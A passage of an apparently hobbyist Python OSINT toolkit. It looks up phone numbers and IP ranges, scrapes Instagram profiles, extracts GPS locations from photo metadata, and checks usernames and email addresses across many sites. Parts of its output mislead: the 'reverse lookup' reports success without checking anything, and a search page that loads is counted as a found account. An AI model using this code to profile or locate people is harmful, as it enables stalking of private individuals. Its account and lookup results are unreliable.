        print(f"{CYAN}Formatted (E164): {RESET}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)}")
        print(f"{CYAN}Formatted (International): {RESET}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
        print(f"{CYAN}Formatted (National): {RESET}{phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}")
        
        print(f"\n{BOLD}{YELLOW}[*] Validation Status:{RESET}")
        print(f"{GREEN if is_valid else RED}✓ Valid Number: {is_valid}{RESET}")
        print(f"{GREEN if is_possible else RED}✓ Possible Number: {is_possible}{RESET}")
        
        print(f"\n{BOLD}{YELLOW}[*] Location Information:{RESET}")
        region = phonenumbers.region_code_for_number(parsed)
        country_name = geocoder.country_name_for_region(region)
        print(f"{CYAN}Region Code: {RESET}{region}")
        print(f"{CYAN}Country: {RESET}{country_name}")
        print(f"{CYAN}Country Code: {RESET}+{parsed.country_code}")
        
        try:
            timezones = timezone.time_zones_for_number(parsed)
            if timezones:
                print(f"{CYAN}Timezone: {RESET}{', '.join(timezones)}")
        except:
            pass
        
        print(f"\n{BOLD}{YELLOW}[*] Carrier Information:{RESET}")
        try:
            carrier_name = carrier.name_for_number(parsed, "en")
            if carrier_name:
                print(f"{CYAN}Carrier/Operator: {RESET}{carrier_name}")
            else:
                print(f"{YELLOW}Carrier info not available{RESET}")
        except:
            print(f"{YELLOW}Carrier lookup unavailable{RESET}")
        
        print(f"\n{BOLD}{YELLOW}[*] Number Type:{RESET}")
        number_type = phonenumbers.number_type(parsed)
        type_map = {0: "Unknown", 1: "Fixed Line", 2: "Mobile", 3: "Fixed-line or Mobile", 4: "Toll Free", 5: "Premium Rate", 6: "Shared Cost", 7: "VoIP", 8: "Personal Number", 9: "Pager", 10: "UAN", 11: "Voicemail", 12: "ITS"}
        print(f"{CYAN}Type: {RESET}{type_map.get(number_type, 'Unknown')}")
        
        print(f"\n{BOLD}{YELLOW}[*] OSINT Information:{RESET}")
        print(f"{CYAN}Prefix: {RESET}{parsed.national_number // 10000000}")
        print(f"{CYAN}Area Code: {RESET}{str(parsed.national_number)[:3] if len(str(parsed.national_number)) >= 3 else 'N/A'}")
        
        print(f"\n{BOLD}{YELLOW}[*] Security Analysis:{RESET}")
        print(f"{YELLOW}Note: For spam/scam checking, use specialized services like TrueCaller, NumBuster{RESET}")
        
        # Try reverse lookup from API
        print(f"\n{BOLD}{YELLOW}[*] Reverse Number Lookup:{RESET}")
        try:
            formatted_e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
            response = requests.get(f"https://nominatim.openstreetmap.org/search?format=json&q={formatted_e164}", timeout=5, verify=False)
            if response.status_code == 200:
                print(f"{YELLOW}○ {RESET}Phone number analysis complete")
        except:
            pass
        
    except ImportError:
        print(f"{RED}phonenumbers library required. Install with: pip install phonenumbers{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")


def ip_generator_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== IP Range Generator & Lookup =={RESET}")
    print(f"{YELLOW}Choose an option:{RESET}")
    print(f"{PURPLE}1{RESET} - Generate IPs from specific ASN/Country")
    print(f"{PURPLE}2{RESET} - Get real public IPs from real networks")
    print(f"{PURPLE}3{RESET} - IP subnet calculator")
    
    print(f"{CYAN}\u25b6 Select option (1-3): {RESET}", end='', flush=True)
    choice = input().strip()
    
    if choice == "1":
        print(f"\n{BOLD}{YELLOW}[*] Real IP Ranges by Country/ASN:{RESET}")
        print(f"{CYAN}▶ Enter country code (e.g., US, IT, UK): {RESET}", end='', flush=True)
        country = input().strip().upper()
        
        try:
            response = requests.get(f"https://api.bgpview.io/country/{country}", timeout=5)
            if response.status_code == 200:
                asn_data = response.json()
                if 'data' in asn_data and 'asns' in asn_data['data']:
                    asns = asn_data['data']['asns'][:10]
                    print(f"\n{BOLD}{CYAN}IP Infrastructure for {country}:{RESET}")
                    print(f"{GREEN}Found {len(asns)} major ASNs in {country}:{RESET}")
                    for asn in asns:
                        print(f"  {CYAN}AS{asn['asn']}: {asn.get('name', 'Unknown')}{RESET}")
                        try:
                            prefix_response = requests.get(f"https://api.bgpview.io/asn/{asn['asn']}/prefixes", timeout=5)
                            if prefix_response.status_code == 200:
                                prefixes = prefix_response.json().get('data', {}).get('ipv4_prefixes', [])[:3]
                                for prefix in prefixes:
                                    print(f"      {PURPLE}├─ {prefix['prefix']}{RESET}")
                        except:
                            pass
        except Exception as e:
            print(f"{RED}Could not fetch real ASN data: {e}{RESET}")
        
        print(f"\n{YELLOW}Tip: These are real IP ranges allocated to networks in {country}{RESET}")
    
    elif choice == "2":
        print(f"\n{BOLD}{YELLOW}[*] Fetching Real Public IPs:{RESET}")
        try:
            print(f"{CYAN}▶ How many IPs to fetch (1-20): {RESET}", end='', flush=True)
            count = int(input().strip())
            if count > 20:
                count = 20
        except:
            count = 5
        
        real_ip_ranges = {
            "Google DNS": "8.8.8.8",
            "Cloudflare DNS": "1.1.1.1",
            "OpenDNS": "208.67.222.222",
            "Quad9": "9.9.9.9",
            "Verisign": "64.6.64.6",
        }
        
        print(f"\n{BOLD}{CYAN}Sample Real Public IPs (DNS Servers):{RESET}")
        for provider, ip in list(real_ip_ranges.items())[:count]:
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    print(f"{GREEN}✓{RESET} {provider:20} {CYAN}{ip:15} {RESET}Location: {data.get('country', 'Unknown')} - {data.get('city', 'Unknown')}")
            except:
                print(f"{YELLOW}○{RESET} {provider:20} {CYAN}{ip:15} {RESET}(Location lookup failed)")
    
    elif choice == "3":
        print(f"\n{BOLD}{YELLOW}[*] IP Subnet Calculator:{RESET}")
        import ipaddress
        
        subnet = input(f"{CYAN}Enter CIDR notation (e.g., 192.168.1.0/24): {RESET}").strip()
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            print(f"\n{BOLD}{CYAN}Subnet Information:{RESET}")
            print(f"{CYAN}Network Address: {RESET}{network.network_address}")
            print(f"{CYAN}Broadcast Address: {RESET}{network.broadcast_address}")
            print(f"{CYAN}Netmask: {RESET}{network.netmask}")
            print(f"{CYAN}Prefix Length: {RESET}/{network.prefixlen}")
            print(f"{CYAN}Total Hosts: {RESET}{network.num_addresses - 2}")
            print(f"{CYAN}First Host: {RESET}{list(network.hosts())[0] if network.num_addresses > 2 else 'N/A'}")
            print(f"{CYAN}Last Host: {RESET}{list(network.hosts())[-1] if network.num_addresses > 2 else 'N/A'}")
            
            print(f"\n{BOLD}{YELLOW}First 10 IPs in range:{RESET}")
            for i, ip in enumerate(network.hosts()):
                if i < 10:
                    print(f"  {PURPLE}{ip}{RESET}")
                else:
                    break
        except ValueError as e:
            print(f"{RED}Invalid subnet: {e}{RESET}")
    
    else:
        print(f"{RED}Invalid option{RESET}")


def instagram_info_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Instagram Username =={RESET}")
    username = input("Enter the Instagram username: ").strip()
    
    if not username:
        print(f"{RED}Username cannot be empty!{RESET}")
        return
    
    print(f"{YELLOW}[*] Attempting to fetch Instagram profile data...{RESET}\n")
    
    # Try multiple methods
    success = False
    
    # Method 1: Try instagrapi (most reliable)
    try:
        from instagrapi import Client
        print(f"{YELLOW}[*] Using instagrapi method...{RESET}")
        client = Client()
        try:
            user = client.user_info_by_username(username)
            print(f"\n{BOLD}{CYAN}Instagram Profile Information (Real Data):{RESET}")
            print(f"{GREEN}✓ {RESET}Username: {CYAN}{user.username}{RESET}")
            print(f"{GREEN}✓ {RESET}Full Name: {CYAN}{user.full_name}{RESET}")
            print(f"{GREEN}✓ {RESET}Bio: {CYAN}{user.biography}{RESET}")
            print(f"{GREEN}✓ {RESET}Followers: {CYAN}{user.follower_count:,}{RESET}")
            print(f"{GREEN}✓ {RESET}Following: {CYAN}{user.following_count:,}{RESET}")
            print(f"{GREEN}✓ {RESET}Posts: {CYAN}{user.media_count}{RESET}")
            print(f"{GREEN}✓ {RESET}Is Private: {CYAN}{'Yes' if user.is_private else 'No'}{RESET}")
            print(f"{GREEN}✓ {RESET}Verified: {CYAN}{'Yes' if user.is_verified else 'No'}{RESET}")
            print(f"{GREEN}✓ {RESET}Business Account: {CYAN}{'Yes' if user.is_business else 'No'}{RESET}")
            if user.website:
                print(f"{GREEN}✓ {RESET}Website: {CYAN}{user.website}{RESET}")
            print(f"{GREEN}✓ {RESET}Profile Picture URL: {CYAN}{user.profile_pic_url}{RESET}")
            success = True
        except Exception as e:
            print(f"{YELLOW}[*] instagrapi method failed: {e}{RESET}")
    except ImportError:
        print(f"{YELLOW}[*] instagrapi not installed, trying alternative methods...{RESET}")
    
    # Method 2: Use GraphQL approach via requests (actually works)
    if not success:
        try:
            print(f"{YELLOW}[*] Using GraphQL endpoint method...{RESET}")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-IG-App-ID': '936619743392459',
            }
            
            # Get user ID first
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                user_data = data.get('data', {}).get('user', {})
                
                if user_data:
                    print(f"\n{BOLD}{CYAN}Instagram Profile Information (Real Data):{RESET}")
                    print(f"{GREEN}✓ {RESET}Username: {CYAN}{user_data.get('username', 'N/A')}{RESET}")
                    print(f"{GREEN}✓ {RESET}Full Name: {CYAN}{user_data.get('full_name', 'N/A')}{RESET}")
                    print(f"{GREEN}✓ {RESET}Bio: {CYAN}{user_data.get('biography', 'N/A')}{RESET}")
                    print(f"{GREEN}✓ {RESET}Followers: {CYAN}{user_data.get('edge_followed_by', {}).get('count', user_data.get('follower_count', 'N/A')):,}{RESET}")
                    print(f"{GREEN}✓ {RESET}Following: {CYAN}{user_data.get('edge_follow', {}).get('count', user_data.get('following_count', 'N/A')):,}{RESET}")
                    print(f"{GREEN}✓ {RESET}Posts: {CYAN}{user_data.get('edge_owner_to_timeline_media', {}).get('count', user_data.get('media_count', 'N/A'))}{RESET}")
                    print(f"{GREEN}✓ {RESET}Is Private: {CYAN}{'Yes' if user_data.get('is_private') else 'No'}{RESET}")
                    print(f"{GREEN}✓ {RESET}Verified: {CYAN}{'Yes' if user_data.get('is_verified') else 'No'}{RESET}")
                    print(f"{GREEN}✓ {RESET}Business Account: {CYAN}{'Yes' if user_data.get('is_business_account') else 'No'}{RESET}")
                    if user_data.get('external_url'):
                        print(f"{GREEN}✓ {RESET}Website: {CYAN}{user_data.get('external_url')}{RESET}")
                    print(f"{GREEN}✓ {RESET}Profile Picture URL: {CYAN}{user_data.get('profile_pic_url_hd', user_data.get('profile_pic_url', 'N/A'))}{RESET}")
                    success = True
                else:
                    print(f"{RED}✗ {RESET}User not found (status 200 but no data)")
            else:
                print(f"{YELLOW}[*] GraphQL method returned status {response.status_code}{RESET}")
        except Exception as e:
            print(f"{YELLOW}[*] GraphQL method failed: {e}{RESET}")
    
    # Method 3: Basic HTML scraping as fallback
    if not success:
        try:
            print(f"{YELLOW}[*] Using HTML scraping fallback method...{RESET}")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            url = f"https://www.instagram.com/{username}/"
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"\n{BOLD}{CYAN}Instagram Profile Information (Public Data):{RESET}")
                print(f"{GREEN}✓ {RESET}Username: {CYAN}{username}{RESET}")
                
                # Extract from meta tags
                og_title = re.search(r'<meta property="og:title" content="([^"]*)"', response.text)
                if og_title:
                    title = og_title.group(1)
                    print(f"{GREEN}✓ {RESET}Title: {CYAN}{title}{RESET}")
                
                og_description = re.search(r'<meta property="og:description" content="([^"]*)"', response.text)
                if og_description:
                    desc = og_description.group(1)
                    print(f"{GREEN}✓ {RESET}Bio/Description: {CYAN}{desc}{RESET}")
                
                og_image = re.search(r'<meta property="og:image" content="([^"]*)"', response.text)
                if og_image:
                    print(f"{GREEN}✓ {RESET}Profile Picture: {CYAN}{og_image.group(1)}{RESET}")
                
                # Try to find account type info
                if '"is_private":true' in response.text or 'Private Account' in response.text:
                    print(f"{GREEN}✓ {RESET}Account Type: {CYAN}Private{RESET}")
                else:
                    print(f"{GREEN}✓ {RESET}Account Type: {CYAN}Public{RESET}")
                
                print(f"{YELLOW}Note: Limited data available via public page (use browser login for complete info){RESET}")
                success = True
            elif response.status_code == 404:
                print(f"{RED}✗ {RESET}User not found on Instagram!")
            else:
                print(f"{RED}✗ {RESET}Instagram returned status: {response.status_code}")
        except Exception as e:
            print(f"{RED}✗ {RESET}Scraping failed: {e}")
    
    if not success:
        print(f"\n{RED}All methods failed. Tips:{RESET}")
        print(f"{YELLOW}1. Check if the username is correct{RESET}")
        print(f"{YELLOW}2. Install instagrapi: pip install instagrapi{RESET}")
        print(f"{YELLOW}3. The account might be rate-limited or private{RESET}")

def photo_osint_tool():
    clear()
    special_ascii_art()
    print(f"{BOLD}{CYAN}== Photo OSINT =={RESET}")
    photo_path = input("Enter the path to the photo file: ").strip()
    
    if not os.path.exists(photo_path):
        print(f"{RED}File not found!{RESET}")
        return
    
    try:
        from PIL import Image
        from PIL.ExifTags import TAGS
        import hashlib
        
        image = Image.open(photo_path)
        
        print(f"\n{BOLD}{YELLOW}[*] Basic Image Information:{RESET}")
        print(f"{GREEN}✓ {RESET}File Size: {CYAN}{os.path.getsize(photo_path) / 1024:.2f} KB{RESET}")
        print(f"{GREEN}✓ {RESET}Dimensions: {CYAN}{image.size[0]} x {image.size[1]} pixels{RESET}")
        print(f"{GREEN}✓ {RESET}Format: {CYAN}{image.format}{RESET}")
        print(f"{GREEN}✓ {RESET}Mode: {CYAN}{image.mode}{RESET}")
        
        # Calculate image hash
        with open(photo_path, 'rb') as f:
            md5_hash = hashlib.md5(f.read()).hexdigest()
            print(f"{GREEN}✓ {RESET}MD5 Hash: {CYAN}{md5_hash}{RESET}")
        
        # Extract EXIF data
        exif_data = image._getexif()
        
        if exif_data:
            print(f"\n{BOLD}{YELLOW}[*] EXIF Metadata:{RESET}")
            
            important_tags = {
                271: "Camera Make",
                272: "Camera Model",
                274: "Orientation",
                305: "Software",
                306: "DateTime",
                36867: "DateTime Original",
                36868: "DateTime Digitized",
                37377: "Shutter Speed",
                37378: "Aperture",
                37379: "Brightness",
                37380: "Exposure Bias",
                37382: "Metering Mode",
                37383: "Light Source",
                37384: "Flash",
                37385: "Focal Length",
                41729: "Color Space",
                34855: "ISO Speed",
            }
            
            gps_data = {}
            
            for tag_id, value in exif_data.items():
                tag_name = TAGS.get(tag_id, tag_id)
                
                # Capture GPS data separately
                if tag_name == "GPSInfo":
                    gps_data = value
                    print(f"{GREEN}✓ {RESET}GPS Data Found: {CYAN}YES{RESET}")
                elif tag_id in important_tags:
                    print(f"{GREEN}✓ {RESET}{important_tags[tag_id]}: {CYAN}{value}{RESET}")
            
            # Parse GPS coordinates if available
            if gps_data:
                print(f"\n{BOLD}{YELLOW}[*] GPS Location Information:{RESET}")
                try:
                    def convert_to_degrees(gps_coordinate):
                        if isinstance(gps_coordinate, (list, tuple)):
                            d = gps_coordinate[0]
                            m = gps_coordinate[1]
                            s = gps_coordinate[2]
                            return d + (m / 60.0) + (s / 3600.0)
                        return None
                    
                    gps_latitude = convert_to_degrees(gps_data.get(2))
                    gps_longitude = convert_to_degrees(gps_data.get(4))
                    
                    if gps_latitude and gps_longitude:
                        lat_ref = gps_data.get(1, 'N')
                        lon_ref = gps_data.get(3, 'E')
                        
                        if lat_ref == 'S':
                            gps_latitude = -gps_latitude
                        if lon_ref == 'W':
                            gps_longitude = -gps_longitude
                        
                        print(f"{GREEN}✓ {RESET}Latitude: {CYAN}{gps_latitude:.6f}{RESET}")
                        print(f"{GREEN}✓ {RESET}Longitude: {CYAN}{gps_longitude:.6f}{RESET}")
                        print(f"{GREEN}✓ {RESET}Map URL: {CYAN}https://maps.google.com/?q={gps_latitude},{gps_longitude}{RESET}")
                        
                        # Try to get location info from coordinates
                        try:
                            response = requests.get(f"http://nominatim.openstreetmap.org/reverse?format=json&lat={gps_latitude}&lon={gps_longitude}", timeout=5)
                            if response.status_code == 200:
                                location = response.json()
                                print(f"{GREEN}✓ {RESET}Location: {CYAN}{location.get('address', {}).get('city', 'Unknown')}, {location.get('address', {}).get('country', 'Unknown')}{RESET}")
                        except:
                            pass
                except Exception as e:
                    print(f"{YELLOW}○ {RESET}GPS parsing failed: {e}")
        else:
            print(f"\n{YELLOW}⚠ {RESET}No EXIF data found in the photo (metadata stripped or not available)")
        
        print(f"\n{BOLD}{YELLOW}[*] Image Analysis:{RESET}")
        print(f"{GREEN}✓ {RESET}Image Source: {CYAN}{photo_path}{RESET}")
        print(f"{YELLOW}Note: This tool extracts existing metadata. Not all photos contain location data.{RESET}")
        
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def username_tracker_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Username Tracker (Enhanced) =={RESET}")
    username = input("Enter the username to search: ").strip()
    
    if not username:
        print(f"{RED}Username cannot be empty!{RESET}")
        return
    
    # Expanded list of platforms with proper URL patterns
    platforms = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter/X": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "YouTube": f"https://youtube.com/@{username}",
        "Twitch": f"https://twitch.tv/{username}",
        "Pinterest": f"https://pinterest.com/{username}",
        "Snapchat": f"https://snapchat.com/add/{username}",
        "Medium": f"https://medium.com/@{username}",
        "Dev.to": f"https://dev.to/{username}",
        "Patreon": f"https://patreon.com/{username}",
        "Behance": f"https://behance.net/{username}",
        "Dribbble": f"https://dribbble.com/{username}",
        "Codepen": f"https://codepen.io/{username}",
        "HackerNews": f"https://news.ycombinator.com/user?id={username}",
        "StackOverflow": f"https://stackoverflow.com/users?tab=newest&search={username}",
        "Telegram": f"https://t.me/{username}",
        "Discord": f"https://discord.com/users/{username}",
        "Quora": f"https://quora.com/profile/{username}",
        "About.me": f"https://about.me/{username}",
        "Mastodon": f"https://mastodon.social/@{username}",
        "Bluesky": f"https://bsky.app/profile/{username}",
        "Flickr": f"https://flickr.com/photos/{username}/",
        "DeviantArt": f"https://deviantart.com/{username}",
        "ArtStation": f"https://artstation.com/{username}",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "Steam": f"https://steamcommunity.com/search/users/{username}",
        "Tumblr": f"https://tumblr.com/blog/{username}",
        "Vimeo": f"https://vimeo.com/{username}",
        "Disqus": f"https://disqus.com/by/{username}",
        "Letterboxd": f"https://letterboxd.com/{username}/",
        "Tiktok (alt)": f"https://vm.tiktok.com/{username}",
    }
    
    print(f"\n{BOLD}{CYAN}Searching for '{username}' across {len(platforms)} platforms...{RESET}\n")
    
    found_count = 0
    found_platforms = []
    
    # Realistic user-agents pool
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    ]
    
    for platform_name, url in platforms.items():
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.google.com/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0',
            }
            
            response = requests.get(url, headers=headers, timeout=12, allow_redirects=True, verify=False)
            
            is_found = False
            
            # Platform-specific validation logic
            if platform_name == "Instagram":
                is_found = response.status_code == 200 and 'instagram' in response.text.lower() and 'Sorry, this page isn\'t available' not in response.text and 'User not found' not in response.text
            elif platform_name == "Twitter/X":
                is_found = response.status_code == 200 and ('This account doesn\'t exist' not in response.text and username.lower() in response.text.lower())
            elif platform_name == "GitHub":
                is_found = response.status_code == 200 and 'github' in response.text.lower() and '404' not in response.text
            elif platform_name == "Reddit":
                is_found = response.status_code == 200 and ('u/' + username.lower() in response.text.lower() or '/user/' in response.text.lower())
            elif platform_name == "TikTok":
                is_found = response.status_code == 200 and 'tiktok' in response.text.lower() and '@' in response.text
            elif platform_name == "Twitch":
                is_found = response.status_code == 200 and ('twitch' in response.text.lower() or username.lower() in response.text.lower())
            elif platform_name == "YouTube":
                is_found = response.status_code == 200 and ('youtube' in response.text.lower() or '@' in response.text)
            elif platform_name == "LinkedIn":
                is_found = response.status_code == 200 and 'linkedin' in response.text.lower()
            elif platform_name == "Discord":
                is_found = response.status_code == 200 and username.lower() in response.text.lower()
            elif platform_name == "Steam":
                is_found = response.status_code == 200 and 'steamcommunity' in response.text.lower()
            elif platform_name == "Telegram":
                is_found = response.status_code == 200 and ('This account does not exist' not in response.text)
            else:
                # Generic: check for 200 status and reasonable content length
                is_found = response.status_code == 200 and len(response.text) > 1000 and 'not found' not in response.text.lower() and 'does not exist' not in response.text.lower()
            
            if is_found:
                print(f"{GREEN}✓ {RESET}{platform_name:20} {CYAN}FOUND - ACCOUNT EXISTS{RESET}")
                print(f"  {PURPLE}→ {url}{RESET}")
                found_count += 1
                found_platforms.append((platform_name, url))
            elif response.status_code == 404:
                print(f"{RED}✗ {RESET}{platform_name:20} {RED}Not Found (404){RESET}")
            elif response.status_code == 403:
                print(f"{YELLOW}⚠ {RESET}{platform_name:20} {YELLOW}Access Forbidden{RESET}")
            else:
                print(f"{YELLOW}○ {RESET}{platform_name:20} {YELLOW}Uncertain (HTTP {response.status_code}){RESET}")
            
            # Be respectful with requests
            time.sleep(random.uniform(0.3, 0.8))
        except requests.exceptions.Timeout:
            print(f"{YELLOW}⏱ {RESET}{platform_name:20} {YELLOW}Timeout (Server too slow){RESET}")
        except requests.exceptions.ConnectionError:
            print(f"{YELLOW}🔌 {RESET}{platform_name:20} {YELLOW}Connection Error{RESET}")
        except Exception as e:
            print(f"{YELLOW}⚠ {RESET}{platform_name:20} {YELLOW}Error{RESET}")
    
    print(f"\n{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    print(f"{BOLD}{YELLOW}Results: {GREEN}{found_count}{RESET} {YELLOW}account(s) found{RESET}")
    print(f"{BOLD}{CYAN}═══════════════════════════════════════{RESET}")
    
    if found_platforms:
        print(f"\n{BOLD}{GREEN}✓ Accounts Found:{RESET}")
        for platform, url in found_platforms:
            print(f"{GREEN}  • {platform:20} {CYAN}{url}{RESET}")
        print(f"\n{YELLOW}[!] These accounts are active and publicly accessible.{RESET}")
    else:
        print(f"\n{YELLOW}No active accounts found with this username.{RESET}")

def email_tracker_tool():
    clear()
    tiger_ascii_art()
    print(f"{BOLD}{CYAN}== Email Tracker (Enhanced Breach Detection) =={RESET}")
    email = input("Enter the email address: ").strip()
    
    if not email or '@' not in email:
        print(f"{RED}Invalid email format!{RESET}")
        return
    
    # Validate email format better
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        print(f"{RED}Invalid email format!{RESET}")
        return
    
    email_user, email_domain = email.split('@', 1)
    email_domain_lower = email_domain.lower()
    
    print(f"\n{BOLD}{YELLOW}[*] Email Analysis:{RESET}")
    print(f"{GREEN}✓ {RESET}Email: {CYAN}{email}{RESET}")
    print(f"{GREEN}✓ {RESET}Username Part: {CYAN}{email_user}{RESET}")
    print(f"{GREEN}✓ {RESET}Domain: {CYAN}{email_domain_lower}{RESET}")
    
    # Check domain validity
    print(f"\n{BOLD}{YELLOW}[*] Domain Information:{RESET}")
    domain_valid = False
    try:
        import dns.resolver
        import dns.exception
        try:
            # Check MX records with timeout
            mx_records = dns.resolver.resolve(email_domain_lower, 'MX', lifetime=5)
            print(f"{GREEN}✓ {RESET}Valid Domain: {CYAN}YES{RESET}")
            print(f"{GREEN}✓ {RESET}MX Records Found: {CYAN}{len(mx_records)}{RESET}")
            for mx in mx_records[:3]:
                print(f"  {PURPLE}├─ {mx.exchange}{RESET}")
            domain_valid = True
        except dns.exception.DNSException:
            print(f"{RED}✗ {RESET}Valid Domain: {CYAN}NO (DNS lookup failed){RESET}")
        except Exception as e:
            print(f"{YELLOW}⚠ {RESET}Domain check failed: {str(e)[:50]}")
    except ImportError:
        print(f"{YELLOW}⚠ {RESET}DNS module not available, using format check")
        if '.' in email_domain and len(email_domain) > 3:
            print(f"{GREEN}✓ {RESET}Domain format appears valid")
            domain_valid = True
    except Exception as e:
        print(f"{YELLOW}⚠ {RESET}Domain check error: {str(e)[:50]}")
    
    # Email provider check
    print(f"\n{BOLD}{YELLOW}[*] Email Provider Information:{RESET}")
    common_providers = {
        'gmail.com': 'Google', 'yahoo.com': 'Yahoo', 'outlook.com': 'Microsoft',
        'hotmail.com': 'Microsoft', 'protonmail.com': 'ProtonMail', 'icloud.com': 'Apple',
        'mail.com': 'Mail.com', 'tutanota.com': 'Tutanota', 'yandex.com': 'Yandex',
        'aol.com': 'AOL', '163.com': '163 Mail', 'qq.com': 'QQ Mail',
    }
    
    provider = common_providers.get(email_domain_lower, 'Unknown/Custom Domain')
    print(f"{GREEN}✓ {RESET}Email Provider: {CYAN}{provider}{RESET}")
    
    # ====== SEARCH WHERE EMAIL IS REGISTERED ======
    print(f"\n{BOLD}{YELLOW}[*] Searching for Accounts & Registrations:{RESET}")
    
    common_sites = [
        ("Gmail", f"https://accounts.google.com/SignUpWithEmail?email={email}"),
        ("GitHub", f"https://github.com/search?q={email}"),
        ("Stack Overflow", f"https://stackoverflow.com/search?q={email}"),
        ("Reddit", f"https://www.reddit.com/r/all/search?q={email}"),
        ("Twitter/X", f"https://twitter.com/search?q={email}"),
        ("LinkedIn", f"https://linkedin.com/search/results/?keywords={email}"),
        ("Facebook", f"https://facebook.com/search/people/?q={email}"),
        ("Discord", f"https://discord.com/search?q={email}"),
        ("Twitch", f"https://twitch.tv/search?term={email}"),
        ("YouTube", f"https://youtube.com/results?search_query={email}"),
        ("Mastodon", f"https://mastodon.social/search?q={email}"),
        ("Tumblr", f"https://tumblr.com/search/{email}"),
    ]
    
    registered_accounts = []
    headers_req = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ])
    }
    
    print(f"{YELLOW}Checking {len(common_sites)} platforms...{RESET}")
    
    for platform_name, search_url in common_sites:
        sys.stdout.write(f"\r{YELLOW}[*] Scanning {platform_name}...{' ' * 20}{RESET}")
        sys.stdout.flush()
        
        try:
            response = requests.get(search_url, headers=headers_req, timeout=8, verify=False, allow_redirects=True)
            if response.status_code == 200 and len(response.text) > 500:
                registered_accounts.append((platform_name, search_url, True))
            elif response.status_code == 404:
                registered_accounts.append((platform_name, search_url, False))
            else:
                registered_accounts.append((platform_name, search_url, None))
        except Exception as e:
            registered_accounts.append((platform_name, search_url, None))
        
        time.sleep(random.uniform(0.2, 0.5))
    
    sys.stdout.write(f"\r{' ' * 80}\r")
    sys.stdout.flush()
    
    print(f"{BOLD}{YELLOW}[✓] Platform Scan Results:{RESET}\n")
    found_count = 0
    for platform_name, search_url, is_found in registered_accounts:
        if is_found == True:
            print(f"{GREEN}✓ {RESET}{platform_name:20} {CYAN}Possible account found{RESET}")
            found_count += 1
        elif is_found == False:
            print(f"{RED}✗ {RESET}{platform_name:20} {RED}Not registered{RESET}")
        else:
            print(f"{YELLOW}○ {RESET}{platform_name:20} {YELLOW}Unable to verify{RESET}")
    
    # ====== ENHANCED BREACH DETECTION ======
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{RED}║ CHECKING MULTIPLE BREACH DATABASES   ║{RESET}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════╝{RESET}")
    
    breach_found = False
    breach_details = []
    
    # *** Method 1: HaveIBeenPwned API ***
    try:
        sys.stdout.write(f"{YELLOW}[1/5] Checking HaveIBeenPwned Database...{RESET}")
        sys.stdout.flush()
        
        headers_api = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'application/json'
        }
        
        response = requests.get(
            f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", 
            headers=headers_api, 
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                breaches = response.json()
                sys.stdout.write(f"\r{' ' * 80}\r")
                sys.stdout.flush()
                if breaches and len(breaches) > 0:
